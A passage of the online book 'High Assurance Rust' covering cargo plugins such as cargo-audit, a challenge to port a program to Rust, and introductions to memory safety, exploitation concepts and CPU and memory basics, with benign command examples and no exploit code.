This means extending <code>cargo</code> with additional subcommands is as often easy as running <code>cargo install &lt;name_of_tool&gt;</code>.
Although some tools have additional setup steps.</p>
<p>We'll sample three different 3rd party plugins.
For the remainder of this section, we'll assume you're using the book's container - which has each pre-installed.
If not, please refer to the documentation of each individual tool (linked to in the footnotes).</p>
<h3 id="cargo-modules"><a class="header" href="#cargo-modules"><code>cargo-modules</code></a></h3>
<p>When you need a quick overview of a large Rust project, <code>cargo-modules</code><sup class="footnote-reference" id="fr-CargoModules-1"><a href="#footnote-CargoModules">14</a></sup> can be handy.
It prints the modules hierarchy, including both internal and external APIs, to console.</p>
<p>Let's try it out on <code>clap</code>, the CLI argument parser we used in Chapter 2:</p>
<pre><code class="language-ignore">git clone git@github.com:clap-rs/clap.git
cd clap/
cargo modules generate tree --with-types --package clap
</code></pre>
<p>You should see a color-coded printout starting with something akin to:</p>
<pre><code class="language-ignore">crate clap
├── const INTERNAL_ERROR_MSG: pub(crate)
├── const INVALID_UTF8: pub(crate)
├── struct SubCommand: pub
├── mod build: pub(crate)
│   ├── mod app_settings: pub(self)
│   │   ├── struct AppFlags: pub
│   │   ├── enum AppSettings: pub
│   │   └── struct Flags: pub(self)
│   ├── mod arg: pub(self)
│   │   ├── struct Arg: pub
│   │   ├── enum ArgProvider: pub(crate)
│   │   ├── enum DisplayOrder: pub(crate)
│   │   ├── type Validator: pub(self)
│   │   ├── type ValidatorOs: pub(self)
│   │   └── fn display_arg_val: pub(crate)
...
</code></pre>
<h3 id="cargo-audit"><a class="header" href="#cargo-audit"><code>cargo-audit</code></a></h3>
<p>Rust's crate ecosystem is something of a "double-edged sword":</p>
<ul>
<li>
<p>On one hand, <code>cargo</code> makes building and integrating external dependencies easy and fun (relative to traditional systems-software build tools, like GNU <code>make</code><sup class="footnote-reference" id="fr-GNUMake-1"><a href="#footnote-GNUMake">15</a></sup>).</p>
</li>
<li>
<p>On the other, professional projects can quickly accumulate a staggering amount of dependencies. Many of which are transitive (dependency of a dependency).</p>
</li>
</ul>
<p>While long compile times are a nuisance, the true downside of large dependency graphs is maintenance.
Just because you've updated to the latest version of a direct dependency doesn't mean its authors have done the same.
It's possible to, directly or indirectly, depend on crate versions with known security issues.</p>
<p>This is where <code>cargo-audit</code><sup class="footnote-reference" id="fr-CargoAudit-1"><a href="#footnote-CargoAudit">16</a></sup>, another <code>cargo</code> plugin, comes in.
It scans your entire dependency graph for known-vulnerable crate versions.
Using public data cataloged in the <em>Rust Security Advisory Database</em><sup class="footnote-reference" id="fr-RustSecDB-1"><a href="#footnote-RustSecDB">17</a></sup>, maintained by the Rust Secure Code Working Group<sup class="footnote-reference" id="fr-RustSecWG-1"><a href="#footnote-RustSecWG">18</a></sup>.</p>
<p>We can audit the full dependency graph of Chapter 2's <code>rcli</code> tool.
Note we run the command from the workspace root, not the <code>rcli</code> folder:</p>
<pre><code class="language-ignore">cd code_snippets/chp2/crypto_tool/
cargo audit
</code></pre>
<p>At the time of this writing, the scan loaded 399 security advisories (the signature data) and checked 29 dependencies (the full dependency graph):</p>
<pre><code class="language-ignore">   Fetching advisory database from `https://github.com/RustSec/advisory-db.git`
      Loaded 399 security advisories (from /home/tb/.cargo/advisory-db)
    Updating crates.io index
    Scanning Cargo.lock for vulnerabilities (29 crate dependencies)
</code></pre>
<p>Remember the static/dynamic known/unknown quadrant from Chapter 2?
<code>cargo-audit</code> won't discover brand new bugs specific to your project, but it's an important health check for your dependencies.</p>
<p>Since our <code>rcli</code> project was fine, you might be curious what <code>cargo-audit</code>'s warning or error output looks like.
Here's a sample warning:</p>
<pre><code class="language-ignore">Crate:         difference
Version:       2.0.0
Warning:       unmaintained
Title:         difference is unmaintained
Date:          2020-12-20
ID:            RUSTSEC-2020-0095
URL:           https://rustsec.org/advisories/RUSTSEC-2020-0095
Dependency tree:
difference 2.0.0
└── predicates 1.0.8
</code></pre>
<h3 id="cargo-binutils"><a class="header" href="#cargo-binutils"><code>cargo-binutils</code></a></h3>
<p><code>cargo-binutils</code><sup class="footnote-reference" id="fr-CargoBinutils-1"><a href="#footnote-CargoBinutils">19</a></sup> is a wrapper for GNU Binutils[^GNUBinutils], a collection of command line tools for inspecting Linux binaries.
We won't enumerate every tool in the Binutils suite here.
To give you a feel - we can use the <code>size</code> subcommand to get the exact count bytes in every section of the output binary for Chapter 2's <code>rcli</code> tool:</p>
<pre><code class="language-ignore">cd code_snippets/chp2/crypto_tool/rcli
cargo size --release -- -A
</code></pre>
<p>One specific line prints the size of the <code>.text</code> section, where ELF<sup class="footnote-reference" id="fr-ELFSpec-1"><a href="#footnote-ELFSpec">20</a></sup> binaries store executable code:</p>
<pre><code class="language-ignore">section                   size     addr
.text                   598995   0x9080
</code></pre>
<p>The exact number reported will vary depending on your compiler version and host architecture.
In our case, <code>rcli</code> contains <code>599 kB</code> of executable code when built with optimizations (<code>--release</code>).</p>
<h2 id="takeaway-14"><a class="header" href="#takeaway-14">Takeaway</a></h2>
<p>1st party tooling lets us generate up-to-date documentation that doubles as a test suite, lint our code for the latest best-practice patterns, ensure consistent formatting across large development teams, and facilitate reproducible builds.</p>
<p>3rd party tools perform a range of auxiliary tasks.
The list above is just a sample of what's out in the ecosystem, with more tools and <code>cargo</code> plugins becoming available every year.</p>
<p>If you build production software in Rust, you're making investment in the language, toolchain, and ecosystem.
Ecosystem dependency versions are easy enough to mange, SemVer<sup class="footnote-reference" id="fr-SemVer-2"><a href="#footnote-SemVer">12</a></sup> numbers are configurable via <code>Cargo.toml</code>.
But what about the language itself?</p>
<p>We'll conclude this chapter by taking a brief look at the release cycle of the Rust toolchain.
Don't worry - changes are always backwards compatible, new versions won't break your code.
But understanding how Rust's versioning works is useful.
Whether you want to keep up with the latest-and-greatest or just keep the production ship sailing smoothly.</p>
<hr>
<ol class="footnote-definition"><li id="footnote-RustDoc">
<p><a href="https://doc.rust-lang.org/rustdoc/what-is-rustdoc.html"><em>What is rustdoc?</em></a>. The Rustdoc Book (Accessed 2022). <a href="#fr-RustDoc-1">↩</a></p>
</li>
<li id="footnote-Markdown">
<p><a href="https://www.markdownguide.org/basic-syntax/"><em>Basic Syntax, The Markdown elements outlined in the original design document.</em></a>. Matt Cone (Accessed 2022). <a href="#fr-Markdown-1">↩</a></p>
</li>
<li id="footnote-ClippyReadme">
<p><a href="https://github.com/rust-lang/rust-clippy/#clippy"><em>Clippy</em></a>. The Rust Team (Accessed 2022). <a href="#fr-ClippyReadme-1">↩</a></p>
</li>
<li id="footnote-ClippyLints">
<p><a href="https://rust-lang.github.io/rust-clippy/master/"><em>Clippy Lints</em></a>. The Rust Team (Accessed 2022). <a href="#fr-ClippyLints-1">↩</a></p>
</li>
<li id="footnote-MachApp">
<p><a href="https://doc.rust-lang.org/nightly/nightly-rustc/rustc_lint_defs/enum.Applicability.html#variant.MachineApplicable"><em><code>MachineApplicable</code></em></a>. The Rust Team (Accessed 2022). <a href="#fr-MachApp-1">↩</a></p>
</li>
<li id="footnote-TrojanSource">
<p><a href="https://arxiv.org/pdf/2111.00169.pdf"><em>Trojan Source: Invisible Vulnerabilities</em></a>. Nicholas Boucher, Ross Anderson (2021). <a href="#fr-TrojanSource-1">↩</a></p>
</li>
<li id="footnote-SrcCVE">
<p><a href="https://blog.rust-lang.org/2021/11/01/cve-2021-42574.html"><em>Security advisory for rustc (CVE-2021-42574)</em></a>. The Rust Team (Accessed 2022). <a href="#fr-SrcCVE-1">↩</a></p>
</li>
<li id="footnote-RustFmt">
<p><a href="https://rust-lang.github.io/rustfmt/"><em>Configuring Rustfmt</em></a>. The Rust Team (Accessed 2022). <a href="#fr-RustFmt-1">↩</a></p>
</li>
<li id="footnote-CargoTomlVsLock">
<p><a href="https://doc.rust-lang.org/cargo/guide/cargo-toml-vs-cargo-lock.html"><em><code>Cargo.toml</code> vs <code>Cargo.lock</code></em></a>. The Cargo Book (Accessed 2022). <a href="#fr-CargoTomlVsLock-1">↩</a></p>
</li>
<li id="footnote-Rayon">
<p><a href="hhttps://crates.io/crates/rayon"><em>rayon</em></a>. Josh Stone, Niko Matsakis (Accessed 2022). <a href="#fr-Rayon-1">↩</a></p>
</li>
<li id="footnote-CargoDep">
<p><a href="https://doc.rust-lang.org/cargo/reference/specifying-dependencies.html"><em>Specifying Dependencies</em></a>. The Cargo Book (Accessed 2022). <a href="#fr-CargoDep-1">↩</a></p>
</li>
<li id="footnote-SemVer">
<p><a href="https://semver.org/"><em>Semantic Versioning 2.0.0</em></a>. Tom Preston-Werner (Accessed 2022). <a href="#fr-SemVer-1">↩</a> <a href="#fr-SemVer-2">↩2</a></p>
</li>
<li id="footnote-ToolFile">
<p><a href="https://rust-lang.github.io/rustup/overrides.html"><em>Overrides</em></a>. The Rustup Book (Accessed 2022). <a href="#fr-ToolFile-1">↩</a></p>
</li>
<li id="footnote-CargoModules">
<p><a href="https://crates.io/crates/cargo-modules"><em>cargo-modules</em></a>. Vincent Esche (Accessed 2022). <a href="#fr-CargoModules-1">↩</a></p>
</li>
<li id="footnote-GNUMake">
<p><a href="https://www.gnu.org/software/make/"><em>GNU Make</em></a>. The Free Software Foundation (Accessed 2022). <a href="#fr-GNUMake-1">↩</a></p>
</li>
<li id="footnote-CargoAudit">
<p><a href="https://crates.io/crates/cargo-audit"><em>cargo-audit</em></a>. Alex Gaynor, Tony Arcieri, Sergey Davidoff (Accessed 2022). <a href="#fr-CargoAudit-1">↩</a></p>
</li>
<li id="footnote-RustSecDB">
<p><a href="https://rustsec.org/advisories/"><em>The Rust Security Advisory Database</em></a>. Rust Secure Code Working Group (Accessed 2022). <a href="#fr-RustSecDB-1">↩</a></p>
</li>
<li id="footnote-RustSecWG">
<p><a href="https://rustsec.org/advisories/"><em>Secure Code Working Group</em></a>. Rust Secure Code Working Group (Accessed 2022). <a href="#fr-RustSecWG-1">↩</a></p>
</li>
<li id="footnote-CargoBinutils">
<p><a href="https://crates.io/crates/cargo-binutils"><em>cargo-binutils</em></a>. The Rust Embedded Working Group (Accessed 2022). <a href="#fr-CargoBinutils-1">↩</a></p>
</li>
<li id="footnote-ELFSpec">
<p><a href="https://refspecs.linuxfoundation.org/elf/elf.pdf"><em>Tool Interface Standard (TIS) Executable and Linking Format (ELF) Specification</em></a>. TIS Committee (1995). <a href="#fr-ELFSpec-1">↩</a></p>
</li>
</ol><div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="hands-on-challenge-port-a-program"><a class="header" href="#hands-on-challenge-port-a-program">Hands-on Challenge: Port a Program</a></h1>
<p>We've covered the bulk of Rust's most important syntax and features.
While you're likely not comfortable with Rust yet, you now know the basics.</p>
<p>One great way to learn a new language, including its idioms and quirks, is to port an existing program written in a language you're already familiar with.
That's the goal of this challenge.</p>
<p>Now we're not advocates of the "Rewrite-It-In-Rust" (RIIR) trend, although there are some great Rust alternatives to existing tools out there<sup class="footnote-reference" id="fr-RIIR-1"><a href="#footnote-RIIR">1</a></sup>.
Rewriting a large piece of software is a risky proposition that, in many contexts, has questionable payoff.</p>
<p>It's typically wiser to write new features, new services, or hardened components in Rust - such that they can interoperate with existing code.
Chapter 13 will cover integrating Rust into non-Rust codebases.</p>
<p>Our motivation for this challenge is gaining a deeper understanding of Rust via contrast.
Not all idioms and patterns of other languages readily translate, so experiencing those differences first-hand can be enlightening.</p>
<h2 id="failing-is-ok"><a class="header" href="#failing-is-ok">"Failing" is OK</a></h2>
<p>You might get stuck somewhere in your port attempt.
Depending on the program you choose.
That's fine!</p>
<p>If that happens, use this challenge as a "personal watermark" - note how far you've come and what the error was.
You can return to the challenge later, after you've had more Rust experience.
Whenever you're up for it.</p>
<h2 id="port-a-program-of-your-choice-to-rust"><a class="header" href="#port-a-program-of-your-choice-to-rust">Port a Program of Your Choice To Rust</a></h2>
<ul>
<li>
<p>Choose a small program (maybe less than 1,000 lines) written in a language you know, and rewrite it from scratch in Rust. We recommend you pick a program you've personally written, especially if you ran into performance limitations. But any program you're deeply interested in is a good choice.</p>
<ul>
<li>Before starting your rewrite, review your program's dependencies. If it uses one or more libraries that have no counterpart on Rust's <a href="https://crates.io/">crates.io</a>, you will either need to choose a different program or also write the dependency yourself. Don't over-scope this challenge!</li>
</ul>
</li>
</ul>
<h2 id="semi-automate-a-c-to-rust-port"><a class="header" href="#semi-automate-a-c-to-rust-port">Semi-automate a C to Rust Port</a></h2>
<ul>
<li>
<p>If you're already an experienced C developer, you can try porting an existing C program using the <code>c2rust</code><sup class="footnote-reference" id="fr-C2Rust-1"><a href="#footnote-C2Rust">2</a></sup> tool. It's an unofficial, open-source, best-effort transpiler that ingests C source code and outputs Rust source code.</p>
<ul>
<li>
<p>The output Rust is, however, both unidiomatic and as <code>unsafe</code> as the input C. Translating C to safe Rust is an open research problem<sup class="footnote-reference" id="fr-C2SaferRust-1"><a href="#footnote-C2SaferRust">3</a></sup> that involves inferring program semantics. So you will still need to do extensive refactoring.</p>
</li>
<li>
<p>Some readers may prefer to return to this challenge after Chapter 13, which covers CFFI and <code>unsafe</code>.</p>
</li>
<li>
<p>If you've never written C before but you're incredibly brave and want or need to learn it, you can still do this challenge! We recommend picking up a copy of <em>Effective C</em><sup class="footnote-reference" id="fr-Ccord-1"><a href="#footnote-Ccord">4</a></sup> to get started.</p>
</li>
</ul>
</li>
</ul>
<br>
<hr>
<ol class="footnote-definition"><li id="footnote-RIIR">
<p><a href="https://github.com/TaKO8Ki/awesome-alternatives-in-rust"><em>Awesome Alternatives in Rust</em></a>. Takayuki Maeda (Accessed 2022). <a href="#fr-RIIR-1">↩</a></p>
</li>
<li id="footnote-C2Rust">
<p><a href="https://github.com/immunant/c2rust"><em><code>c2rust</code></em></a>. Immunant (Accessed 2022). <a href="#fr-C2Rust-1">↩</a></p>
</li>
<li id="footnote-C2SaferRust">
<p><a href="https://sites.cs.ucsb.edu/~benh/research/papers/oopsla21-extended.pdf"><em>Translating C to Safer Rust</em></a>. Mehmet Emre, Ryan Schroeder, Kyle Dewey, Ben Hardekopf (2021). <a href="#fr-C2SaferRust-1">↩</a></p>
</li>
<li id="footnote-Ccord">
<p><a href="https://amzn.to/3wBuNu7"><em><strong>[PERSONAL FAVORITE]</strong> Effective C: An Introduction to Professional C Programming</em></a>. Robert Seacord (2020). <a href="#fr-Ccord-1">↩</a></p>
</li>
</ol><div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="understanding-memory-safety-and-exploitation"><a class="header" href="#understanding-memory-safety-and-exploitation">Understanding Memory Safety and Exploitation</a></h1>
<hr />
<blockquote>
<p><strong>Note:</strong> This section is a work-in-progress.</p>
</blockquote>
<p>The "Dunning-Kruger effect" <sup class="footnote-reference" id="fr-DKEffect-1"><a href="#footnote-DKEffect">1</a></sup> is an ironic phenomenon: people tend to overestimate their own understanding and abilities, particularly in areas where they have little knowledge or experience.</p>
<p>Yet even veteran programmers can fall victim to some variation of this effect.
Our egos often convince us that we know precisely what will happen when our code executes.
We wrote it, after all.</p>
<p>In reality a modern program is an incredibly complex apparatus built atop an even more complex hierarchy of hardware and software abstractions.
All operating in miraculous unison.
Few among us actually understand program execution from the physics of logic gates to the corner cases of network protocols.
Most of the time we can't even get the layer we're working at right.
Hence version numbers.</p>
<p>The good news is we don't have to know it all.
In Chapter 1's Dreyfus Model, the "Competent" stage was marked by the rude realization that the learner's knowledge is remarkably limited.
In response, the learner needs to de-prioritize the less relevant details and focus on those pertinent to their end goals.
To separate the wheat from the chaff.</p>
<p>Systems programming requires a mental model of "what the computer is doing", but it doesn't have to be exhaustive.
In truth, programming languages which give developers "full control"<sup class="footnote-reference" id="fr-Ctrl-1"><a href="#footnote-Ctrl">2</a></sup> over the hardware - like C and Rust - deal primary with the concepts and mechanisms of one thing: memory.</p>
<ul>
<li>
<p>If you understand the bulk of how and why memory works, you're well on your way to mastery of low-level programming.</p>
</li>
<li>
<p>If you understand how attackers craft memory corruption exploits, you're more likely to catch real bugs and exploitable vulnerabilities in cross-language code and/or <code>unsafe</code> Rust before it reaches production.</p>
</li>
</ul>
<h2 id="isnt-systems-programming-more-than-just-managing-memory"><a class="header" href="#isnt-systems-programming-more-than-just-managing-memory">Isn't systems programming more than just managing memory?</a></h2>
<p>Certainly.
Remember the three hypothetical engineers introduced in Chapter 1, when discussing what defines a "system program"?</p>
<p>Each engineer held a different view, because each came from a specialization requiring unique expertise.
For example:</p>
<ul>
<li>
<p>Distributed systems developers understand <strong>consensus protocols</strong> and <strong>fault tolerance</strong>.</p>
</li>
<li>
<p>Device driver developers work with <strong>kernel APIs</strong> and <strong>interrupt handling</strong>.</p>
</li>
<li>
<p>Microcontroller firmware developers interface with  <strong>analog components</strong> and read <strong>device datasheets</strong>.</p>
</li>
</ul>
<p>But these facets of systems programming are largely domain-specific.
Effective use of memory is a sort of universal bottleneck, it's necessary but not sufficient for writing performant applications.
Regardless of domain.</p>
<p>This chapter will cover universal computer architecture principles relevant to controlling memory.
The meat of what every systems programmer ought to know.
We'll put these principles into practice in Chapter 6, implementing a stack storage abstraction that maximizes both safety and portability.</p>
<h2 id="memory-knowledge-dump"><a class="header" href="#memory-knowledge-dump"><del>Memory</del> Knowledge Dump</a></h2>
<p>Memory is perhaps the most single important topic in this book.
This is our final conceptual chapter, the rest of our adventure will focus on writing a Rust library.
Grab a coffee now (Yerba Mate if you must) because we're gonna really get into the mechanical details here.</p>
<p>We'll start by looking at memory from a software perspective, the model of most systems programmers work with day-to-day.
Then we'll dig into the attacker's perspective, learning about how memory corruption bugs are turned into devastating exploits.
We'll learn about dynamic debugging and perform introductory, hands-on heap exploitation.
Once you can subvert rules and assumptions, you truly understand how something works.
At least when it comes to security.</p>
<p>Armed with a deeper understanding of memory, we'll examine how Rust provides memory safety guarantees.
In detail.</p>
<!--
TODO: add appendix section on integer representation instead

Then we'll tackle two more narrow but nonetheless important topics: integer representation issues and Rust's `!#[no_std]` attribute.
--->
<p>We'll conclude our memory world tour by exploring language-agnostic mitigations and looking at real-world Rust CVEs.</p>
<blockquote>
<p><strong>What about the hardware perspective?</strong></p>
<p>The <a href="chp4/../chp16_appendix/mem_hierarch.html"><em>Fundamentals: Memory Hierarchy</em></a> section of the Appendix takes a hardware-centric view, looking at performance tradeoffs within the modern memory hierarchy.
Highly recommend it as a supplement to this section.</p>
</blockquote>
<h3 id="breaking-down-practical-abstractions"><a class="header" href="#breaking-down-practical-abstractions">Breaking Down Practical Abstractions</a></h3>
<p>To motivate concepts and visualizations in this chapter, lets assume two things:</p>
<ol>
<li>
<p><strong>Forward engineering</strong> requires understanding fundamental abstractions well enough to <em>create ideal solutions</em>.</p>
</li>
<li>
<p><strong>Reverse engineering</strong> and <strong>exploit development</strong> requires understanding fundamental abstractions well enough to subvert seemingly-ideal solutions, to <em>break trust assumptions</em>.</p>
</li>
</ol>
<p>That desugars to, in a hopefully practical but definitely opinionated fashion, <em>just three</em> fundamental abstractions.
To preview:</p>
<ol>
<li><strong>Application Logic Finite State Machine (FSM)</strong> - The business and/or mission requirements, implemented as an executable, imperfect application. Consider the lifecycle of a server's web socket:</li>
</ol>
</br>
<p align="center">
  <img width="70%" src="chp4/socket_state_machine.svg">
  <figure>
  <figcaption><center>POSIX Socket API FSM (server focus)</center></figcaption><br>
  </figure>
</p>
<ol start="2">
<li><strong>Execution Environment</strong> - A compiled application binary loaded into a dynamic execution/runtime environment. With OS-provided process and thread abstractions. Backed by static memory, stack memory, and heap memory. The bulk of Chapter 4 lives here.</li>
</ol>
</br>
<p align="center">
  <img width="80%" src="chp4/program_process.svg">
  <figure>
  <figcaption><center>Mapping of on-disk, executable contents to in-memory process space.</center></figcaption><br>
  </figure>
</p>
<ol start="3">
<li><strong>Hardware FSM</strong> - The Central Processing Unit (CPU). A hardware FSM on which all user applications are ultimately emulated. Key to keep in mind.</li>
</ol>
</br>
<p align="center">
  <img width="80%" src="chp4/cpu_model.svg">
  <figure>
  <figcaption><center>A simplified overview of a CPU, RAM, and persistent storage. Not specific to any particular architecture. </center></figcaption><br>
  </figure>
</p>
<p>We'll cover these three bottom-up, intervening assurance concepts.
There'll also be plenty of other abstraction diagrams.
But after finishing the chapter, maybe you'll start viewing memory primarily through these three lens.</p>
<h2 id="learning-outcomes-3"><a class="header" href="#learning-outcomes-3">Learning Outcomes</a></h2>
<ul>
<li>Develop a mental model of system memory and program execution</li>
<li>Develop a mental model of memory safety, type safety, and binary exploitation</li>
<li>Learn to debug Rust code using Mozilla <code>rr</code><sup class="footnote-reference" id="fr-RR-1"><a href="#footnote-RR">3</a></sup> (an enhanced variant of <code>gdb</code><sup class="footnote-reference" id="fr-GDB-1"><a href="#footnote-GDB">4</a></sup>)</li>
<li>Understand how attackers exploit heap memory corruption bugs, step-by-step</li>
<li>Write your first an introductory exploit or two, bypassing modern protections!</li>
<li>Understand how Rust actually provides memory safety, including current limitations</li>
<li>Understand how modern, language-agnostic exploit mitigations work (and how they can fail)</li>
</ul>
<hr>
<ol class="footnote-definition"><li id="footnote-DKEffect">
<p><a href="https://pubmed.ncbi.nlm.nih.gov/10626367/">"Unskilled and Unaware of It: How Difficulties in Recognizing One's Own Incompetence Lead to Inflated Self-Assessments"</a>. Justin Kruger, David Dunning (1999) <a href="#fr-DKEffect-1">↩</a></p>
</li>
<li id="footnote-Ctrl">
<p>In both programming and modern life, you never quite have full control. In programming that's because both compilers and interpreters make oft-inscrutable decisions for you (e.g. aggressive optimization<sup class="footnote-reference" id="fr-Opt-1"><a href="#footnote-Opt">5</a></sup>) and, rarely, even contain bugs<sup class="footnote-reference" id="fr-CompBug-1"><a href="#footnote-CompBug">6</a></sup>. <a href="#fr-Ctrl-1">↩</a></p>
</li>
<li id="footnote-RR">
<p><a href="https://rr-project.org/"><em><code>rr</code></em></a>. Mozilla (Accessed 2022). <a href="#fr-RR-1">↩</a></p>
</li>
<li id="footnote-GDB">
<p><a href="https://www.sourceware.org/gdb/"><em>GDB: The GNU Project Debugger</em></a>. GNU project (Accessed 2022). <a href="#fr-GDB-1">↩</a></p>
</li>
<li id="footnote-Opt">
<p><a href="https://queue.acm.org/detail.cfm?id=3212479"><em>C Is Not a Low-level Language: Your computer is not a fast PDP-11.</em></a>. David Chisnall (2018). <a href="#fr-Opt-1">↩</a></p>
</li>
<li id="footnote-CompBug">
<p>One particular funny case is CVE-2020-24658<sup class="footnote-reference" id="fr-StackVuln-1"><a href="#footnote-StackVuln">7</a></sup>, a failed compiler-inserted stack protection. As an aside, vulnerabilities <em>patched</em> by new compiler versions are an interesting category. Which can include <em>hardware</em> vulnerabilities (e.g. CVE-2021-35465<sup class="footnote-reference" id="fr-VLLDMVuln-1"><a href="#footnote-VLLDMVuln">8</a></sup>). <a href="#fr-CompBug-1">↩</a></p>
</li>
<li id="footnote-StackVuln">
<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-24658"><em>CVE-2020-24658 Detail</em></a>. National Institute of Standards and Technology (2020). <a href="#fr-StackVuln-1">↩</a></p>
</li>
<li id="footnote-VLLDMVuln">
<p><a href="https://developer.arm.com/support/arm-security-updates/vlldm-instruction-security-vulnerability"><em>VLLDM instruction Security Vulnerability</em></a>. ARM (2021). <a href="#fr-VLLDMVuln-1">↩</a></p>
</li>
</ol><div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="software-perspective-cpu-to-process"><a class="header" href="#software-perspective-cpu-to-process">Software Perspective: CPU to Process</a></h1>
<p>We want to build a mental model of "what the machine is doing".
Of how, at a mechanical level, a computer executes a program in memory.
Systems programmers work within the confines of this model to write efficient programs.
Exploit developers abuse it to take control of vulnerable programs.</p>
<p>Recall that our mental model doesn't need to reflect every intricacy of reality.
A more <em>complex</em> model isn't necessarily a more <em>useful</em> one, even if technically more accurate.
We're primarily interested in a single concept at the core of every "low-level"<sup class="footnote-reference" id="fr-Chp1Levels-1"><a href="#footnote-Chp1Levels">1</a></sup> language: runtime memory management.</p>
<p>That entails understanding how the <strong>stack</strong> and the <strong>heap</strong>, two memory locations mentioned in the last chapter, work.
In considerable detail.
We'll start with the stack for two reasons:</p>
<ol>
<li>
<p><strong>Ubiquity</strong> -  Stack memory is present on every system, from the tiniest microcontroller to beefiest server. Use of heap memory is common but also optional. A non-embedded program can choose to avoid heap allocations for performance or portability, but an embedded platform may not support the heap at all. Stack memory is always at play.</p>
</li>
<li>
<p><strong>Simplicity</strong> - Stack memory is implemented with hardware support, its operations are relatively simple. We can push (add) frames onto the stack and pop (remove) frames from the top. By contrast, heap memory's logic is complex and controlled by software. Stack memory can be discussed generally, but understanding heap fundamentals requires studying a specific allocator's implementation (which we'll do!).</p>
</li>
</ol>
<p>Before we push on to stack memory proper (pun intended), we need to briefly cover two prerequisites: CPUs and program loading.
Both topics are the subjects of entire technical books, so we'll visually diagram just enough detail to scaffold our mental model of the runtime stack.</p>
<blockquote>
<p><strong>What kinds of "embedded systems" don't use heap memory?</strong></p>
<p>"Embedded system" is a term so broad it borders on meaningless.
At least without more specific context.
To aid general discussion, Muench et al.<sup class="footnote-reference" id="fr-CorruptCrash-1"><a href="#footnote-CorruptCrash">2</a></sup> propose a taxonomy that can be useful for practical differentiation:</p>
<ul>
<li>
<p><strong>Type-I:</strong> General purpose OS-based devices - a "slimmed" down version of commodity desktop/server software.</p>
<ul>
<li><em>Example:</em> car infotainment system retrofitting the Linux kernel.</li>
<li>Supports both stack and heap memory.</li>
</ul>
</li>
<li>
<p><strong>Type-II:</strong> Embedded OS-based devices - custom software for low-resources and/or single-purpose platforms.</p>
<ul>
<li><em>Example:</em> NASA's Mars exploration rover running the VxWorks RTOS<sup class="footnote-reference" id="fr-MarsVx-1"><a href="#footnote-MarsVx">3</a></sup>.</li>
<li>Supports stack memory, heap memory use is optional/modular.</li>
</ul>
</li>
<li>
<p><strong>Type-III:</strong> Devices without an OS abstraction - the entire software stack is a "monolithic firmware", a single control loop occasionally servicing external events (e.g. peripheral-triggered interrupts).</p>
<ul>
<li><em>Example:</em> a GPS receiver using custom firmware for positional trilateration.</li>
<li>Often restricted to stack memory alone<sup class="footnote-reference" id="fr-CustomAlloc-1"><a href="#footnote-CustomAlloc">4</a></sup>.</li>
</ul>
</li>
</ul>
<p>Stack memory is crucial to the operation of all 3 types of embedded systems.
Think of it as a universal abstraction for program runtimes.</p>
<p>The remainder of this section represents Type-I and Type-II systems<sup class="footnote-reference" id="fr-T3-1"><a href="#footnote-T3">5</a></sup>.
Our visualizations generally assume fundamental OS abstractions, like virtual memory and processes, are present.</p>
</blockquote>
<h2 id="the-cpu-and-ram"><a class="header" href="#the-cpu-and-ram">The CPU and RAM</a></h2>
</br>
<p align="center">
  <img width="100%" src="chp4/cpu_model.svg">
  <figure>
  <figcaption><center>A simplified overview of a CPU, RAM, and persistent storage. Not specific to any particular architecture. </center></figcaption><br>
  </figure>
</p>
<p>Main memory, a physical machine's Random Access Memory (RAM), supports all non-trivial runtime computation.
The bit-patterns it stores and operates on representations two distinct items:</p>
<ul>
<li>
<p><strong>Data</strong> - Variable-length sequences of bytes representing any information: hardcoded strings, colors codes, numbers, entire image and video files, etc. Each byte can be addressed individually, even if word-aligned accesses are often preferable for performance.</p>
<ul>
<li>Data can be written to or read from disk or network (e.g. <em>persistent storage</em>), but any programmatic update means reading the data into RAM (e.g. <em>volatile storage</em>), performing the modification, and writing it back.</li>
</ul>
</li>
<li>
<p><strong>Code</strong> - Native CPU instructions encoded as short sequences of bytes. In the above diagram, we assume all valid instructions are the same length<sup class="footnote-reference" id="fr-FixedLen-1"><a href="#footnote-FixedLen">6</a></sup>. A <em>word</em> is a CPU's "natural" unit of data (what its hardware is designed to operate on efficiently).</p>
<ul>
<li>Instructions focus on low-level operations: arithmetic, boolean logic, condition testing, moving data in memory, etc. Arbitrarily complex programs can be broken down into long sequences of these basic operations<sup class="footnote-reference" id="fr-MovObfu-1"><a href="#footnote-MovObfu">7</a></sup>. Assembly language is a human-readable representation of raw instruction encodings (aka "machine code").</li>
</ul>
</li>
</ul>
<p>The Central Processing Unit (CPU) is a very fast instruction processing state machine with small pieces of "scratch space" for storing intermediate results called <em>registers</em>.
Final results are written back to RAM.
Registers come in two flavors:</p>
